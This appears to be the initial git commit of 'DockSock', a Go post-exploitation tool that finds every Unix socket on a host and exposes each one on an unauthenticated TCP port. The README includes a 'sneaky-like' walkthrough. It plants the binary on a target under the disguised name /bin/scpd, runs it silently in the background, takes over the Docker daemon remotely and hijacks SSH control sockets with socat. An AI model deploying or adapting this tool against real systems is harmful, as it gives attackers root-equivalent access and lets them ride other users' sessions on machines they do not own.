a8aae5ad5f8fb6ebb1cdfa248da3a8e018c0d677
Stuart <kd5pbo@gmail.com>
2019-02-07 21:54:40 -0500

    Initial commit

---
+++ README.md
@@ -0,0 +1,49 @@
+DockSock
+========
+
+Nifty little TCP -> Unix Socket proxy.  Meant to expose docker/ssh control
+sockets to the network.
+
+By default, it searches the entire filesystem for unix sockets and for each one
+found spawns a TCP listener which will create connections proxied to the Unix
+socket.  The starting (i.e. lowest) port is configurable.
+
+A simple substring (e.g. `docker` or `.ssh`) may be used to filter the sockets
+exposed.  This is handy to only expose certain services.
+
+The list of found an served sockets can be found by making a TCP connection
+(e.g. with netcat) to the lowest port, which by default is `61111`.
+
+For legal use only.
+
+Quickstart
+----------
+```bash
+go install github.com/magisterquis/docksock
+docksock -v
+```
+
+Slightly Less Quickstart, sneaky-like
+-------------------------------------
+```bash
+# Build the tool
+go get github.com/magisterquis/docksock
+go build -o docksock github.com/magisterquis/docksock
+
+# Put it on target
+scp docksock user@target:/bin/scpd
+ssh user@target 'nohup /bin/scpd >/dev/null 2>&1 &'
+
+# Give it time to find some sockets
+sleep 60
+
+# List the available sockets
+nc target 61111
+
+# Connect to something fun
+docker -H target:61112 version
+
+# Even deviouser
+socat -d -d unix-listen:./s,fork tcp:target:61113 &
+ssh -S ./s user@a
+```
---
+++ docksock.go
@@ -0,0 +1,317 @@
+// Program docksock exposes docker sockets to the network
+package main
+
+/*
+ * docksock.go
+ * Expose docker sockets to the network
+ * By J. Stuart McMurray
+ * Created 20190207
+ * Last Modified 20190207
+ */
+
+import (
+	"errors"
+	"flag"
+	"fmt"
+	"io"
+	"log"
+	"net"
+	"os"
+	"path/filepath"
+	"strings"
+	"sync"
+)
+
+var (
+	/* verbose is the logging function */
+	verbose = func(string, ...interface{}) {}
+
+	// ErrNoPortsLeft is returned if there's no more allowed listening
+	// ports
+	ErrNoPortsLeft = errors.New("no more ports")
+)
+
+// CloseWriter is an interface which wraps the CloseWrite method.
+type CloseWriter interface {
+	CloseWrite() error
+}
+
+/* checker is used to pass a context to filepath.Walk */
+type walker struct {
+	wg     *sync.WaitGroup
+	np     uint /* Next port to try to listen on */
+	npL    *sync.Mutex
+	ss     string /* Substring which sockets must contain */
+	slist  string /* Socket list */
+	slistL *sync.Mutex
+}
+
+/* walkFn is called for every walked file */
+func (w *walker) walkFn(path string, info os.FileInfo, err error) error {
+	/* Don't care about things we can't access */
+	if nil != err {
+		return nil
+	}
+	/* Skip /proc, /sys, and /dev */
+	if strings.HasPrefix(path, "/proc") ||
+		strings.HasPrefix(path, "/sys") ||
+		strings.HasPrefix(path, "/dev") {
+		return filepath.SkipDir
+	}
+
+	/* Make sure it's a socket */
+	if 0 == info.Mode()&os.ModeSocket {
+		return nil
+	}
+
+	/* Make sure it contains the substring */
+	if !strings.Contains(path, w.ss) {
+		return nil
+	}
+
+	/* It's a matching socket, serve it */
+	w.wg.Add(1)
+	go w.serve(path)
+
+	return nil
+}
+
+/* listen listens on the next port.  It may return ErrNoPortsLeft if there are
+no more ports left for listening. */
+func (w *walker) listen() (net.Listener, error) {
+	var (
+		l   net.Listener
+		err error
+	)
+	/* Find a port on which to listen */
+	for p := w.nextPort(); 0 != p; p = w.nextPort() {
+		a := net.JoinHostPort(
+			net.IPv4zero.String(),
+			fmt.Sprintf("%v", p),
+		)
+		l, err = net.Listen("tcp", a)
+		if nil != err {
+			verbose("Cannot listen on %v: %v", a, err)
+			continue
+		}
+		return l, nil
+	}
+	/* If we still haven't got a port, bummer */
+	return nil, ErrNoPortsLeft
+}
+
+/* serve proxies tcp connections on the next available port to the socket */
+func (w *walker) serve(path string) {
+	defer w.wg.Done()
+
+	/* Spawn a listener */
+	l, err := w.listen()
+	if nil != err {
+		verbose("[%v] Unable to make listener: %v", path, err)
+		return
+	}
+	verbose("Listening on %v for connections to %v", l.Addr(), path)
+	defer l.Close()
+
+	/* Not the listening socket and path */
+	w.slistL.Lock()
+	w.slist += fmt.Sprintf("%v -> %v\n", l.Addr(), path)
+	w.slistL.Unlock()
+
+	/* Accept and serve clients */
+	for {
+		c, err := l.Accept()
+		if nil != err {
+			verbose(
+				"Error accepting connection to %v: %v",
+				l.Addr(),
+				err,
+			)
+			break
+		}
+		w.wg.Add(1)
+		go w.proxy(c, path)
+	}
+}
+
+/* proxy proxies between c and the unix socket at path */
+func (w *walker) proxy(c net.Conn, path string) {
+	defer c.Close()
+	defer w.wg.Done()
+
+	tag := fmt.Sprintf("%v -> %v", c.RemoteAddr(), path)
+	verbose("[%v] Connected", tag)
+
+	/* Try to connect to the socket */
+	s, err := net.Dial("unix", path)
+	if nil != err {
+		m := fmt.Sprintf(
+			"[%v] Unable to connect to socket: %v",
+			tag,
+			err,
+		)
+		verbose("%s", m)
+		fmt.Fprintf(c, "%s", m)
+		return
+	}
+
+	/* Proxy bytes back and forth */
+	var (
+		pwg sync.WaitGroup
+		fn  int64
+		rn  int64
+	)
+	pwg.Add(2)
+
+	go func() {
+		defer pwg.Done()
+		if cw, ok := c.(CloseWriter); ok {
+			defer cw.CloseWrite()
+		}
+		n, err := io.Copy(c, s)
+		if nil != err && io.EOF != err {
+			verbose(
+				"[%v] Error sending data to %v: %v",
+				tag,
+				c.RemoteAddr(),
+				err,
+			)
+		}
+		rn = n
+	}()
+	go func() {
+		defer pwg.Done()
+		if cw, ok := s.(CloseWriter); ok {
+			defer cw.CloseWrite()
+		}
+		n, err := io.Copy(s, c)
+		if nil != err && io.EOF != err {
+			verbose(
+				"[%v] Error sending data from %v: %v",
+				tag,
+				path,
+				err,
+			)
+		}
+		fn = n
+	}()
+	pwg.Wait()
+
+	verbose("[%v] Done.  %v bytes forward, %v bytes back.", tag, fn, rn)
+}
+
+/* nextPort returns the next port in w */
+func (w *walker) nextPort() uint {
+	w.npL.Lock()
+	defer w.npL.Unlock()
+	p := w.np
+	w.np++
+	w.np %= 65536
+	return p
+}
+
+/* serveList serves the list of listening sockets.  It closes ready when it's
+ready to serve */
+func (w *walker) serveList(ready chan<- struct{}) {
+	/* Spawn a listener */
+	l, err := w.listen()
+	if nil != err {
+		verbose("Unable to listen for list queries: %v", err)
+		os.Exit(1)
+	}
+	verbose("Listening on %v for list queries", l.Addr())
+	defer l.Close()
+	close(ready)
+
+	/* Service queries for lists */
+	for {
+		c, err := l.Accept()
+		if nil != err {
+			verbose("Unable to accept list query client: %v", err)
+			break
+		}
+		w.wg.Add(1)
+		go func(lc net.Conn) {
+			defer w.wg.Done()
+			defer lc.Close()
+			w.slistL.Lock()
+			s := w.slist
+			if "" == s {
+				s = "none yet\n"
+			}
+			w.slistL.Unlock()
+			fmt.Fprintf(lc, "%s", s)
+			verbose("[%v] List query", lc.RemoteAddr())
+		}(c)
+	}
+}
+
+func main() {
+	var (
+		ss = flag.String(
+			"path-match",
+			"",
+			"Socket paths must contain `substr` to be served",
+		)
+		startPort = flag.Uint(
+			"start-port",
+			61111,
+			"Starting `port` to use for socket service",
+		)
+		startDir = flag.String(
+			"top-dir",
+			"/",
+			"Topmost `directory` in which to search for sockets",
+		)
+		logOn = flag.Bool(
+			"v",
+			false,
+			"Verbose logging",
+		)
+	)
+	flag.Usage = func() {
+		fmt.Fprintf(
+			os.Stderr,
+			`Usage: %v [options]
+
+Finds unix sockets matching a regex and for each found socket, listens on a TCP
+port and forwards connections to the Unix socket.
+
+The first port will send a list of port -> socket mappings to any connecting
+client.
+
+Options:
+`,
+			os.Args[0],
+		)
+		flag.PrintDefaults()
+	}
+	flag.Parse()
+
+	/* Disable logging, maybe */
+	if *logOn {
+		log.SetOutput(os.Stdout)
+		verbose = log.Printf
+	}
+
+	/* Walk context */
+	w := &walker{
+		wg:     new(sync.WaitGroup),
+		np:     *startPort,
+		npL:    new(sync.Mutex),
+		ss:     *ss,
+		slistL: new(sync.Mutex),
+	}
+
+	/* Serve up a list of sockets */
+	ready := make(chan struct{})
+	go w.serveList(ready)
+	<-ready
+
+	/* Look for sockets */
+	if err := filepath.Walk(*startDir, w.walkFn); nil != err {
+		log.Fatalf("Error walking file tree: %v", err)
+	}
+
+	w.wg.Wait()
+}
